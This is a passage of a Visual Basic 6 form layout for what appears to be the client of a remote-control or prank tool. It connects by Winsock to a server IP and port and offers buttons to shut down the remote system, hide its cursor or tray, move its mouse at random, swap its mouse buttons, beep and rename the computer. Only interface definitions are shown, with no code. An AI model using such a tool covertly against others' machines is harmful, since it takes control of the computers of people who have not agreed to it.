         TabIndex        =   124
         Top             =   2880
         Width           =   975
      End
      Begin VB.Line Line139 
         BorderColor     =   &H80000005&
         X1              =   4680
         X2              =   4680
         Y1              =   5040
         Y2              =   1680
      End
      Begin VB.Line Line138 
         BorderColor     =   &H80000005&
         X1              =   2040
         X2              =   6240
         Y1              =   5040
         Y2              =   5040
      End
      Begin VB.Label lblterminate 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SHUTDOWN"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   4920
         MouseIcon       =   "frm_main.frx":6CE0
         MousePointer    =   99  'Custom
         TabIndex        =   58
         ToolTipText     =   "Shutdown The System"
         Top             =   2160
         Width           =   1095
      End
      Begin VB.Line Line137 
         BorderColor     =   &H80000005&
         X1              =   2040
         X2              =   6240
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Label Label25 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Windows"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   2055
         TabIndex        =   123
         Top             =   1335
         Width           =   4155
      End
      Begin VB.Line Line136 
         BorderColor     =   &H80000005&
         X1              =   2040
         X2              =   2040
         Y1              =   1320
         Y2              =   5040
      End
      Begin VB.Line Line135 
         BorderColor     =   &H80000005&
         X1              =   6240
         X2              =   6240
         Y1              =   5040
         Y2              =   1320
      End
      Begin VB.Line Line134 
         BorderColor     =   &H80000005&
         X1              =   2040
         X2              =   6240
         Y1              =   1320
         Y2              =   1320
      End
   End
   Begin VB.PictureBox Picture6 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   96
      Top             =   360
      Width           =   8895
      Begin VB.TextBox txtdtime 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   3720
         MaxLength       =   5
         TabIndex        =   45
         Text            =   "200"
         ToolTipText     =   "Double Click Time"
         Top             =   2225
         Width           =   615
      End
      Begin VB.TextBox txtmxaxis 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   360
         MaxLength       =   3
         TabIndex        =   42
         Text            =   "x"
         ToolTipText     =   "X-Position Of Cursor"
         Top             =   2225
         Width           =   375
      End
      Begin VB.TextBox txtmyaxis 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   960
         MaxLength       =   3
         TabIndex        =   43
         Text            =   "y"
         ToolTipText     =   "Y-Position Of Cursor"
         Top             =   2225
         Width           =   375
      End
      Begin VB.Label lblfmouse 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "STOP"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   7440
         MouseIcon       =   "frm_main.frx":6FEA
         MousePointer    =   99  'Custom
         TabIndex        =   41
         ToolTipText     =   "Stops Funny Mouse"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Line Line17 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   720
         Y2              =   720
      End
      Begin VB.Line Line121 
         BorderColor     =   &H80000005&
         X1              =   8640
         X2              =   8640
         Y1              =   1320
         Y2              =   360
      End
      Begin VB.Line Line119 
         BorderColor     =   &H80000005&
         X1              =   2760
         X2              =   2760
         Y1              =   1320
         Y2              =   360
      End
      Begin VB.Line Line118 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   120
         Y1              =   360
         Y2              =   1320
      End
      Begin VB.Label Label92 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Cursor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   135
         TabIndex        =   116
         Top             =   375
         Width           =   2595
      End
      Begin VB.Line Line117 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   720
         Y2              =   720
      End
      Begin VB.Label lblscursor 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SHOW"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   240
         MouseIcon       =   "frm_main.frx":72F4
         MousePointer    =   99  'Custom
         TabIndex        =   36
         ToolTipText     =   "Show Cursor In Server"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Label lblhcursor 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "HIDE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1560
         MouseIcon       =   "frm_main.frx":75FE
         MousePointer    =   99  'Custom
         TabIndex        =   37
         ToolTipText     =   "Hide Cursor In Server"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Line Line116 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Line Line115 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   5760
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line114 
         BorderColor     =   &H80000005&
         X1              =   5760
         X2              =   5760
         Y1              =   1320
         Y2              =   360
      End
      Begin VB.Line Line113 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   3120
         Y1              =   360
         Y2              =   1320
      End
      Begin VB.Label Label89 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Swap Mouse"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   3135
         TabIndex        =   115
         Top             =   375
         Width           =   2595
      End
      Begin VB.Line Line112 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   5760
         Y1              =   720
         Y2              =   720
      End
      Begin VB.Label lbleswapm 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "ENABLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   3240
         MouseIcon       =   "frm_main.frx":7908
         MousePointer    =   99  'Custom
         TabIndex        =   38
         ToolTipText     =   "Make Left Handed Mouse"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Label lbldswapm 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "DISABLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   4560
         MouseIcon       =   "frm_main.frx":7C12
         MousePointer    =   99  'Custom
         TabIndex        =   39
         ToolTipText     =   "Make Right Handed Mouse"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Line Line111 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   5760
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Line Line110 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line109 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   6000
         Y1              =   360
         Y2              =   1320
      End
      Begin VB.Label Label86 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Funny Mouse"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   6015
         TabIndex        =   114
         Top             =   375
         Width           =   2595
      End
      Begin VB.Label lblfmouse 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "START"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   6120
         MouseIcon       =   "frm_main.frx":7F1C
         MousePointer    =   99  'Custom
         TabIndex        =   40
         ToolTipText     =   "Starts Funny Mouse - Changes Cursor Position Randomly"
         Top             =   945
         Width           =   1095
      End
      Begin VB.Line Line108 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Line Line107 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line106 
         BorderColor     =   &H80000005&
         X1              =   2760
         X2              =   2760
         Y1              =   2640
         Y2              =   1680
      End
      Begin VB.Line Line105 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   120
         Y1              =   1680
         Y2              =   2640
      End
      Begin VB.Label Label83 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Cursor Position"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   135
         TabIndex        =   113
         Top             =   1695
         Width           =   2595
      End
      Begin VB.Line Line104 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Label lblsetcur 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SET"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1560
         MouseIcon       =   "frm_main.frx":8226
         MousePointer    =   99  'Custom
         TabIndex        =   44
         ToolTipText     =   "Set Cursor Position"
         Top             =   2230
         Width           =   1095
      End
      Begin VB.Line Line103 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Line Line102 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   5760
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line101 
         BorderColor     =   &H80000005&
         X1              =   5760
         X2              =   5760
         Y1              =   2640
         Y2              =   1680
      End
      Begin VB.Line Line100 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   3120
         Y1              =   1680
         Y2              =   2640
      End
      Begin VB.Label Label80 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Double Click Time"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   3135
         TabIndex        =   112
         Top             =   1695
         Width           =   2595
      End
      Begin VB.Line Line99 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   5760
         Y1              =   2040
         Y2              =   2040
      End
      Begin VB.Label lblsetdtime 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SET"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   4560
         MouseIcon       =   "frm_main.frx":8530
         MousePointer    =   99  'Custom
         TabIndex        =   46
         ToolTipText     =   "Set Double Click Time"
         Top             =   2230
         Width           =   1095
      End
      Begin VB.Line Line98 
         BorderColor     =   &H80000005&
         X1              =   3120
         X2              =   5760
         Y1              =   2640
         Y2              =   2640
      End
      Begin VB.Line Line97 
         BorderColor     =   &H80000005&
         X1              =   120
         X2              =   2760
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Label Label6 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Mouse Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   97
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5880
      Index           =   0
      Left            =   1920
      ScaleHeight     =   5820
      ScaleWidth      =   8835
      TabIndex        =   88
      Top             =   360
      Width           =   8895
      Begin VB.Timer connecttimer 
         Interval        =   3000
         Left            =   3360
         Top             =   3360
      End
      Begin MSWinsockLib.Winsock sockclient 
         Left            =   2760
         Top             =   3360
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.TextBox txtserverport 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   4800
         MaxLength       =   5
         TabIndex        =   1
         Text            =   "3333"
         ToolTipText     =   "Server Port"
         Top             =   3000
         Width           =   1215
      End
      Begin VB.TextBox txtserverip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   3960
         TabIndex        =   0
         Text            =   "127.0.0.1"
         ToolTipText     =   "Server IP or Name"
         Top             =   2400
         Width           =   2055
      End
      Begin VB.Label lbldconnect 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Disconnect"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   4440
         MouseIcon       =   "frm_main.frx":883A
         MousePointer    =   99  'Custom
         TabIndex        =   3
         ToolTipText     =   "Disconnect Fom Server"
         Top             =   4080
         Width           =   1575
      End
      Begin VB.Label lblconnect 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   2760
         MouseIcon       =   "frm_main.frx":8B44
         MousePointer    =   99  'Custom
         TabIndex        =   2
         ToolTipText     =   "Connect With Server"
         Top             =   4080
         Width           =   1575
      End
      Begin VB.Line Line8 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2640
         X2              =   6135
         Y1              =   4440
         Y2              =   4440
      End
      Begin VB.Line Line10 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   6120
         X2              =   6120
         Y1              =   3960
         Y2              =   4440
      End
      Begin VB.Line Line9 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2640
         X2              =   2640
         Y1              =   3960
         Y2              =   4440
      End
      Begin VB.Line Line7 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2640
         X2              =   6135
         Y1              =   3960
         Y2              =   3960
      End
      Begin VB.Label Label14 
         BackColor       =   &H00404040&
         Caption         =   "PORT NUMBER :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   2760
         TabIndex        =   103
         Top             =   3000
         Width           =   1335
      End
      Begin VB.Label Label13 
         BackColor       =   &H00404040&
         Caption         =   "SERVER IP :"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   2760
         TabIndex        =   102
         Top             =   2400
         Width           =   975
      End
      Begin VB.Line Line6 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2640
         X2              =   6135
         Y1              =   3840
         Y2              =   3840
      End
      Begin VB.Line Line5 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   6120
         X2              =   6120
         Y1              =   1680
         Y2              =   3840
      End
      Begin VB.Line Line4 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2640
         X2              =   6120
         Y1              =   1680
         Y2              =   1680
      End
      Begin VB.Line Line2 
         BorderColor     =   &H80000005&
         Index           =   0
         X1              =   2640
         X2              =   2640
         Y1              =   1680
         Y2              =   3840
      End
      Begin VB.Label Label1 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Index           =   0
         Left            =   0
         TabIndex        =   89
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.PictureBox Picture4 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   92
      Top             =   360
      Width           =   8895
      Begin VB.TextBox txttime 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   7560
         MaxLength       =   9
         TabIndex        =   29
         Text            =   "Time"
         ToolTipText     =   "Duration Of Beep"
         Top             =   3360
         Width           =   975
      End
      Begin VB.TextBox txtfreq 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   6240
         MaxLength       =   5
         TabIndex        =   28
         Text            =   "Freq"
         ToolTipText     =   "Frequency Of The Beep"
         Top             =   3360
         Width           =   975
      End
      Begin VB.TextBox txtcmpname 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         MaxLength       =   15
         TabIndex        =   24
         ToolTipText     =   "New Computer Name"
         Top             =   3330
         Width           =   2415
      End
      Begin VB.Label lblrun 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "RUN"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   225
         Left            =   3720
         MouseIcon       =   "frm_main.frx":8E4E
         MousePointer    =   99  'Custom
         TabIndex        =   27
         ToolTipText     =   "Run ScreenSaver"
         Top             =   4060
         Width           =   1095
      End
      Begin VB.Line Line96 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   4335
         Y2              =   4335
      End
      Begin VB.Line Line95 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   4005
         Y2              =   4005
      End
      Begin VB.Label Label9 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Screensaver"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   270
         Left            =   3050
         TabIndex        =   126
         Top             =   3735
         Width           =   2595
      End
      Begin VB.Line Line94 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   3000
         Y1              =   3720
         Y2              =   4330
      End
      Begin VB.Line Line89 
         BorderColor     =   &H80000005&
         X1              =   5640
         X2              =   5640
         Y1              =   4330
         Y2              =   3700
      End
      Begin VB.Line Line40 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   3720
         Y2              =   3720
      End
      Begin VB.Line Line16 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   3720
         Y2              =   3720
      End
      Begin VB.Line Line15 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   4320
         Y2              =   4320
      End
      Begin VB.Label lblfplay 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "PLAY"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   6840
         MouseIcon       =   "frm_main.frx":9158
         MousePointer    =   99  'Custom
         TabIndex        =   30
         ToolTipText     =   "Make Beep"
         Top             =   3960
         Width           =   1095
      End
      Begin VB.Line Line14 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   3240
         Y2              =   3240
      End
      Begin VB.Label Label2 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "BEEP"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   6015
         TabIndex        =   122
         Top             =   2895
         Width           =   2595
      End
      Begin VB.Line Line13 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   6000
         Y1              =   2880
         Y2              =   4320
      End
      Begin VB.Line Line12 
         BorderColor     =   &H80000005&
         X1              =   8640
         X2              =   8640
         Y1              =   4320
         Y2              =   2880
      End
      Begin VB.Line Line11 
         BorderColor     =   &H80000005&
         X1              =   6000
         X2              =   8640
         Y1              =   2880
         Y2              =   2880
      End
      Begin VB.Line Line126 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   2880
         Y2              =   2880
      End
      Begin VB.Line Line125 
         BorderColor     =   &H80000005&
         X1              =   2640
         X2              =   2640
         Y1              =   4320
         Y2              =   2880
      End
      Begin VB.Line Line124 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   0
         Y1              =   2880
         Y2              =   4320
      End
      Begin VB.Label Label93 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Computer Name"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   330
         Left            =   15
         TabIndex        =   121
         Top             =   2895
         Width           =   2595
      End
      Begin VB.Line Line123 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   3240
         Y2              =   3240
      End
      Begin VB.Label lblcompchange 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "CHANGE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   720
         MouseIcon       =   "frm_main.frx":9462
         MousePointer    =   99  'Custom
         TabIndex        =   25
         ToolTipText     =   "Change Computer Name"
         Top             =   3960
         Width           =   1095
      End
      Begin VB.Line Line122 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   4320
         Y2              =   4320
      End
      Begin VB.Line Line80 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   3720
         Y2              =   3720
      End
      Begin VB.Line Line76 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   2880
         Y2              =   2880
      End
      Begin VB.Line Line66 
         BorderColor     =   &H80000005&
         X1              =   5640
         X2              =   5640
         Y1              =   3490
         Y2              =   2865
      End
      Begin VB.Line Line60 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   3000
         Y1              =   2880
         Y2              =   3490
      End
      Begin VB.Label Label40 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Minimize All"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   275
         Left            =   3015
         TabIndex        =   120
         Top             =   2895
         Width           =   2595
      End
      Begin VB.Line Line41 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   3160
         Y2              =   3160
      End
      Begin VB.Label lblmin 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "MINIMIZE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   230
         Left            =   3720
         MouseIcon       =   "frm_main.frx":976C
         MousePointer    =   99  'Custom
         TabIndex        =   26
         ToolTipText     =   "Minimize All Windows"
         Top             =   3225
         Width           =   1095
      End
      Begin VB.Line Line39 
         BorderColor     =   &H80000005&
         X1              =   3000
         X2              =   5640
         Y1              =   3490
         Y2              =   3490
      End
      Begin VB.Line Line88 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   1320
         Y2              =   1320
      End
      Begin VB.Label lblstrayhide 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "HIDE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   1440
         MouseIcon       =   "frm_main.frx":9A76
         MousePointer    =   99  'Custom
         TabIndex        =   13
         ToolTipText     =   "Hide System Tray"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Label lblstrayshow 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SHOW"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Left            =   120
         MouseIcon       =   "frm_main.frx":9D80
         MousePointer    =   99  'Custom
         TabIndex        =   12
         ToolTipText     =   "Show System Tray"
         Top             =   960
         Width           =   1095
      End
      Begin VB.Line Line87 
         BorderColor     =   &H80000005&
         X1              =   0
         X2              =   2640
         Y1              =   720
         Y2              =   720
      End
      Begin VB.Label Label66 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "System Tray"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
